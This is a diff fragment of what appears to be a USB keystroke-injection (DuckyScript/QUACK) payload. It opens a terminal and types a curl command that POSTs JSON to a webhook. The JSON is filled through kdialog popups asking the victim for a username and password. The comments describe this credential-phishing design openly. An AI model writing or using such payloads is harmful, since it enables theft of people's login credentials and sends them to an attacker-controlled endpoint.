@@ -34,7 +34,7 @@ QUACK CTRL-ALT t
 QUACK DELAY 2000
 
 # A short and efficient cURL command to send an HTTP POST request to a webhook URL with JSON data in the request body.
-QUACK STRING $(curl -H 'Content-Type: application/json' -X POST -d '{\"content\": \"$(
+QUACK STRING \$(curl -H 'Content-Type: application/json' -X POST -d '{\"content\": \"\$(
 
 # A compact command that uses kdialog to display a popup message prompting (into the curl content section) the user to enter their username and password to proceed. You can't acquire multiple input in one popup, so you should use multiple popup, as i wrote here.
 QUACK STRING kdialog --title $POPUP_TITLE0 --msgbox $POPUP-MESSAGE0; 
